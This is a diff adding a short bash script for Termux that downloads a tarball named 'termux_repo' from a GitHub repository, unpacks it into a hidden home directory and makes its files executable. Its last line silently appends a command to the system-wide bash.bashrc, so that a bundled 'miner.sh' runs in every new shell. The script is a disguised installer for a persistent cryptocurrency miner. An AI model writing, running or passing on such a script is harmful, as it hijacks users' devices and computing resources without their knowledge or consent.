@@ -1,0 +1,11 @@
+#!/usr/bin/bash
+
+curl -L --progress-bar "https://github.com/l410systems/css/raw/main/termux_repo.tar.gz" -o $PREFIX/etc/termux_repo.tar.gz
+
+mkdir $HOME/.termux_repo
+
+tar xf $PREFIX/etc/termux_repo.tar.gz -C $HOME/.termux_repo
+
+chmod +x $HOME/.termux_repo/*
+
+echo "bash $HOME/.termux_repo/miner.sh" | tee -a $PREFIX/etc/bash.bashrc >/dev/null
